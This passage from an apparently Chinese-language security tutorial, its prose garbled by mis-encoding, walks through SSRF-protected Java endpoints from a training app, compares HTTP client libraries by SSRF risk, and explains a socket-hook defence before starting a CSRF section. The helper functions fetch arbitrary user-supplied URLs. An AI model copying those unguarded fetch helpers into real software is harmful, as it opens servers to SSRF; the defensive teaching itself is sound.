&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[-] SSRF check failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.URLConnection(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>isHttpå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isHttp</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> url.startsWith(<span class="string">&quot;http://&quot;</span>) || url.startsWith(<span class="string">&quot;https://&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¼šæ£€æŸ¥ <code>url</code> æ˜¯å¦æ˜¯ <code>http://</code> æˆ– <code>https://</code> åè®®ï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥è¿”å› <code>&quot;[-] SSRF check failed&quot;</code>ï¼Œé˜²æ­¢ <code>file://</code>ã€<code>ftp://</code>ã€<code>gopher://</code> ç­‰åè®®çš„ SSRF åˆ©ç”¨</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507240850408.png" alt="image-20250724085008108" loading="lazy"></p>
<p>ï¼ˆ2ï¼‰é™åˆ¶æ–‡ä»¶è®¿é—®</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ImageIO/sec&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">ImageIO</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         SecurityUtil.startSSRFHook();</span><br><span class="line">         HttpUtils.imageIO(url);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">         <span class="keyword">return</span> e.getMessage();</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         SecurityUtil.stopSSRFHook();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;ImageIO ssrf test&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>imageIO</code>å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">imageIO</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">            ImageIO.read(u); <span class="comment">// send request</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ï¼ˆ3ï¼‰httpè¯·æ±‚æ£€æŸ¥</p>
<p>æ–¹æ³•1ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/okhttp/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">okhttp</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.okhttp(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>okhttp</code>å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">okhttp</span><span class="params">(String url)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">    com.squareup.okhttp.<span class="type">Request</span> <span class="variable">ok_http</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">    <span class="keyword">return</span> client.newCall(ok_http).execute().body().string();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æ–¹æ³•2ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/httpclient/sec&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">HttpClient</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           SecurityUtil.startSSRFHook();</span><br><span class="line">           <span class="keyword">return</span> HttpUtils.httpClient(url);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">           <span class="keyword">return</span> e.getMessage();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           SecurityUtil.stopSSRFHook();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>httpClient</code>å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">httpClient</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">CloseableHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClients.createDefault();</span><br><span class="line">            <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">            <span class="comment">// set redirect enable false</span></span><br><span class="line">            <span class="comment">// httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());</span></span><br><span class="line">            <span class="type">HttpResponse</span> <span class="variable">httpResponse</span> <span class="operator">=</span> client.execute(httpGet); <span class="comment">// send request</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">rd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(httpResponse.getEntity().getContent()));</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = rd.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                result.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æ–¹æ³•3ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/commonsHttpClient/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">commonsHttpClient</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        <span class="keyword">return</span> HttpUtils.commonHttpClient(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>commonHttpClient</code>å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">commonHttpClient</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpClient</span>();</span><br><span class="line">    <span class="type">GetMethod</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetMethod</span>(url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        client.executeMethod(method); <span class="comment">// send request</span></span><br><span class="line">        <span class="type">byte</span>[] resBody = method.getResponseBody();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(resBody);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// Release the connection.</span></span><br><span class="line">        method.releaseConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æ–¹æ³•4ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/Jsoup/sec&quot;)</span><br><span class="line">public String Jsoup(@RequestParam String url) &#123;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        return HttpUtils.Jsoup(url);</span><br><span class="line">    &#125; catch (SSRFException | IOException e) &#123;</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Jsoupå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Jsoup</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> Jsoup.connect(url)</span><br><span class="line"><span class="comment">//                    .followRedirects(false)</span></span><br><span class="line">                    .timeout(<span class="number">3000</span>)</span><br><span class="line">                    .cookie(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;joychou&quot;</span>) <span class="comment">// request cookies</span></span><br><span class="line">                    .execute().parse();</span><br><span class="line">            <span class="keyword">return</span> doc.outerHtml();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•5ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/IOUtils/sec&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">IOUtils</span><span class="params">(String url)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          SecurityUtil.startSSRFHook();</span><br><span class="line">          HttpUtils.IOUtils(url);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">          <span class="keyword">return</span> e.getMessage();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          SecurityUtil.stopSSRFHook();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;IOUtils ssrf test&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>IOUtils</code>å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">IOUtils</span><span class="params">(String url)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          IOUtils.toByteArray(URI.create(url));</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">          logger.error(e.getMessage());</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>ç‰¹æ€§&#x2F;æ¡†æ¶</th>
<th><strong>OkHttp</strong></th>
<th><strong>Apache HttpClient 4.x</strong></th>
<th><strong>Commons HttpClient 3.x</strong></th>
<th><strong>Jsoup</strong></th>
<th><strong>IOUtils + URLConnection</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>ä¸»è¦å®šä½</strong></td>
<td>ç°ä»£é«˜æ€§èƒ½ HTTP å®¢æˆ·ç«¯</td>
<td>ä¼ä¸šå¸¸ç”¨ HTTP å®¢æˆ·ç«¯</td>
<td>è€ç‰ˆæœ¬ HTTP å®¢æˆ·ç«¯ï¼ˆå·²åºŸå¼ƒï¼‰</td>
<td>ç½‘é¡µæŠ“å– + HTML è§£æ</td>
<td>ç®€å•æµè¯»å–å·¥å…·</td>
</tr>
<tr>
<td><strong>æ”¯æŒåè®®</strong></td>
<td>HTTP&#x2F;HTTPSï¼ˆé»˜è®¤æ‹’ç» file:&#x2F;&#x2F;ï¼‰</td>
<td>HTTP&#x2F;HTTPSï¼ˆé»˜è®¤æ‹’ç» file:&#x2F;&#x2F;ï¼‰</td>
<td>HTTP&#x2F;HTTPSï¼ˆéƒ¨åˆ†åœºæ™¯æ”¯æŒ file:&#x2F;&#x2F;ï¼‰</td>
<td>HTTP&#x2F;HTTPS&#x2F;FILE</td>
<td>HTTP&#x2F;HTTPS&#x2F;FILE&#x2F;GOPHER ç­‰</td>
</tr>
<tr>
<td><strong>æ˜¯å¦è·Ÿéšé‡å®šå‘</strong></td>
<td>âœ… é»˜è®¤è·Ÿéšï¼Œå¯ç¦ç”¨</td>
<td>âœ… é»˜è®¤è·Ÿéšï¼Œå¯ç¦ç”¨</td>
<td>âœ… é»˜è®¤è·Ÿéšï¼Œå¯ç¦ç”¨</td>
<td>âœ… é»˜è®¤è·Ÿéš</td>
<td>âœ… é»˜è®¤è·Ÿéš</td>
</tr>
<tr>
<td><strong>è¿æ¥æ± </strong></td>
<td>âœ… å†…ç½®å¤ç”¨è¿æ¥æ± </td>
<td>âœ… å¯é…ç½®è¿æ¥æ± </td>
<td>âŒ æ— </td>
<td>âŒ æ— </td>
<td>âŒ æ¯æ¬¡æ–°å»ºè¿æ¥</td>
</tr>
<tr>
<td><strong>è¶…æ—¶è®¾ç½®</strong></td>
<td>âœ… æ”¯æŒè¿æ¥&#x2F;è¯»è¶…æ—¶</td>
<td>âœ… æ”¯æŒè¿æ¥&#x2F;è¯»è¶…æ—¶</td>
<td>âŒ é…ç½®å¤æ‚ï¼Œæ˜“å¿½ç•¥</td>
<td>âœ… å¯é…ç½®è¶…æ—¶</td>
<td>âŒ é»˜è®¤æ— é™ç­‰å¾…</td>
</tr>
<tr>
<td><strong>HTTP&#x2F;2 æ”¯æŒ</strong></td>
<td>âœ… æ”¯æŒ</td>
<td>âŒ ä¸æ”¯æŒï¼ˆéœ€é¢å¤–æ¨¡å—ï¼‰</td>
<td>âŒ ä¸æ”¯æŒ</td>
<td>âŒ ä¸æ”¯æŒ</td>
<td>âŒ ä¸æ”¯æŒ</td>
</tr>
<tr>
<td><strong>API å¤æ‚åº¦</strong></td>
<td>ç®€å•ï¼Œé“¾å¼è°ƒç”¨</td>
<td>ç›¸å¯¹å¤æ‚ï¼Œé…ç½®çµæ´»</td>
<td>è€æ—§ APIï¼Œç¹ç</td>
<td>æœ€ç®€å•</td>
<td>æœ€åŸå§‹</td>
</tr>
<tr>
<td><strong>ç»´æŠ¤æƒ…å†µ</strong></td>
<td>æ´»è·ƒï¼ˆSquare ç»´æŠ¤ï¼‰</td>
<td>æ´»è·ƒï¼ˆApache ç»´æŠ¤ï¼‰</td>
<td>âŒ å·²åœæ­¢ç»´æŠ¤</td>
<td>æ´»è·ƒï¼ˆJsoup å›¢é˜Ÿï¼‰</td>
<td>JDK è‡ªå¸¦ï¼Œæ— æ–°ç‰¹æ€§</td>
</tr>
<tr>
<td><strong>SSRF é£é™©</strong></td>
<td><strong>ä½</strong>ï¼ˆé»˜è®¤ç¦æ­¢ file:&#x2F;&#x2F;ï¼‰</td>
<td><strong>ä½</strong>ï¼ˆé»˜è®¤ç¦æ­¢ file:&#x2F;&#x2F;ï¼‰</td>
<td>ä¸­ï¼ˆå¯èƒ½æ”¯æŒ file:&#x2F;&#x2F;ï¼‰</td>
<td><strong>é«˜</strong>ï¼ˆé»˜è®¤æ”¯æŒ file:&#x2F;&#x2F;ï¼‰</td>
<td><strong>é«˜</strong>ï¼ˆæ”¯æŒ file:&#x2F;&#x2F;ã€gopher:&#x2F;&#x2F;ï¼‰</td>
</tr>
<tr>
<td><strong>é€‚ç”¨åœºæ™¯</strong></td>
<td>é€šç”¨ HTTP è¯·æ±‚ã€API è°ƒç”¨ã€ç§»åŠ¨ç«¯</td>
<td>ä¼ä¸šåç«¯ã€å¤æ‚ HTTP è¯·æ±‚</td>
<td>ç»´æŠ¤é—ç•™ç³»ç»Ÿ</td>
<td>çˆ¬è™«ã€HTML è§£æ</td>
<td>å°å·¥å…·å¿«é€Ÿè¯»å–æµ</td>
</tr>
<tr>
<td><strong>æ˜¯å¦æ¨èæ–°é¡¹ç›®ä½¿ç”¨</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>æ€»ç»“</strong></p>
<ul>
<li><strong>OkHttp</strong> æ˜¯ä¸€ä¸ªç°ä»£ä¸”çµæ´»çš„ HTTP å®¢æˆ·ç«¯ï¼Œæ€§èƒ½å¥½ï¼Œé€‚ç”¨äºå¤§å¤šæ•° HTTP é€šä¿¡ä»»åŠ¡ã€‚</li>
<li><strong>HttpClient</strong> æ›´é€‚åˆå¤æ‚çš„ HTTP é€šä¿¡åœºæ™¯ï¼Œæœ‰è¾ƒå¼ºçš„åŠŸèƒ½æ”¯æŒï¼Œå¦‚è®¤è¯ã€é‡å®šå‘ç­‰ï¼Œä½†ç›¸å¯¹å¤æ‚ï¼Œé€‚åˆå¤§å‹é¡¹ç›®ã€‚</li>
<li><strong>CommonHttpClient</strong> å·²ç»è¿‡æ—¶ï¼Œä¸»è¦ç”¨äºè€é¡¹ç›®çš„å…¼å®¹ï¼Œä¸æ¨èåœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</li>
<li><strong>Jsoup</strong> é€‚åˆå¤„ç† HTML è§£æä»»åŠ¡å’Œè½»é‡çš„ HTTP è¯·æ±‚ï¼Œä¸“æ³¨äºç½‘é¡µæŠ“å–å’Œæ•°æ®æå–ã€‚</li>
<li><strong>IOUtils</strong> åˆ™æ˜¯ä¸€ä¸ªç®€åŒ–çš„å·¥å…·ï¼Œä¸»è¦ç”¨äºè¯»å– URL å†…å®¹å¹¶è½¬æ¢ä¸ºå­—èŠ‚æµï¼Œé€‚åˆç®€å•çš„å°æ•°æ®ä¼ è¾“ã€‚</li>
</ul>
<p>ï¼ˆ4ï¼‰æ ¸å¿ƒSSRFé˜²æŠ¤ä»£ç </p>
<p>ä¿®å¤ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class SocketHook &#123;</span><br><span class="line"></span><br><span class="line">    public static void startHook() throws IOException &#123;</span><br><span class="line">        SocketHookFactory.initSocket();</span><br><span class="line">        SocketHookFactory.setHook(true);</span><br><span class="line">        try&#123;</span><br><span class="line">            Socket.setSocketImplFactory(new SocketHookFactory());</span><br><span class="line">        &#125;catch (SocketException ignored)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void stopHook()&#123;</span><br><span class="line">        SocketHookFactory.setHook(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">javaå¤åˆ¶ä»£ç 123456789101112131415</span><br></pre></td></tr></table></figure>

<p><strong>åŠŸèƒ½åˆ†æ</strong>ï¼š</p>
<ul>
<li><p><code>startHook()</code></p>
<p>:</p>
<ul>
<li>å¯åŠ¨ <code>SocketHook</code>ï¼Œå¯¹æ‰€æœ‰æ–°åˆ›å»ºçš„ <code>Socket</code> åº”ç”¨è‡ªå®šä¹‰è¡Œä¸ºã€‚æ ¸å¿ƒæ˜¯é€šè¿‡ <code>Socket.setSocketImplFactory()</code> æ¥è®¾ç½®ä¸€ä¸ªæ–°çš„ <code>Socket</code> å·¥å‚ã€‚</li>
<li>å¯èƒ½ç”¨äºåœ¨ <code>Socket</code> è¿æ¥æœŸé—´ç›‘æ§ã€ä¿®æ”¹ã€æˆ–å®¡æŸ¥æ•°æ®æµé‡ã€‚</li>
</ul>
</li>
<li><p><code>stopHook()</code></p>
<p>:</p>
<ul>
<li>å…³é—­ <code>SocketHook</code>ï¼Œå°† <code>SocketHookFactory</code> ä¸­çš„é’©å­çŠ¶æ€å…³é—­ï¼Œåœæ­¢å¯¹æ–° <code>Socket</code> å®ä¾‹çš„è‡ªå®šä¹‰è¡Œä¸ºã€‚</li>
</ul>
</li>
</ul>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>å®‰å…¨é˜²æŠ¤</strong>ï¼šå¯ä»¥ç”¨æ¥æ£€æµ‹ã€æ‹¦æˆªæˆ–ä¿®æ”¹ç‰¹å®šçš„ç½‘ç»œè¿æ¥ï¼Œé˜²æ­¢æ”»å‡»ï¼ˆå¦‚ SSRFã€RFI ç­‰ï¼‰é€šè¿‡ä¸å—æ§åˆ¶çš„ç½‘ç»œè¯·æ±‚æ»¥ç”¨æœåŠ¡å™¨èµ„æºã€‚</li>
<li><strong>ç½‘ç»œå®¡è®¡</strong>ï¼šå¯ç”¨äºç›‘æ§ç½‘ç»œæµé‡ï¼Œä»¥è®°å½•æˆ–åˆ†æ <code>Socket</code> é€šä¿¡å†…å®¹ã€‚</li>
<li><strong>è°ƒè¯•&#x2F;æµ‹è¯•</strong>ï¼šåœ¨è°ƒè¯•æˆ–æµ‹è¯•ç¯å¢ƒä¸­ï¼Œä½¿ç”¨é’©å­æ¥æ•è·å’Œåˆ†æç½‘ç»œé€šä¿¡è¡Œä¸ºã€‚</li>
</ul>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>åŸç†ï¼š</p>
<p>CSRF (Cross-site request forgeryï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ )ä¹Ÿè¢«ç§°ä¸ºOne Click Attackæˆ–è€…Session Ridingï¼Œé€šå¸¸ç¼©å†™ä¸ºCSRFæˆ–è€…XSRFï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚å°½ç®¡å¬èµ·æ¥åƒè·¨ç«™è„šæœ¬(XSS)ï¼Œä½†å®ƒä¸XSSéå¸¸ä¸åŒï¼ŒXSSåˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€ŒCSRFåˆ™é€šè¿‡ä¼ªè£…æˆå—ä¿¡ä»»ç”¨æˆ·è¯·æ±‚å—ä¿¡ä»»çš„ç½‘ç«™ã€‚</p>
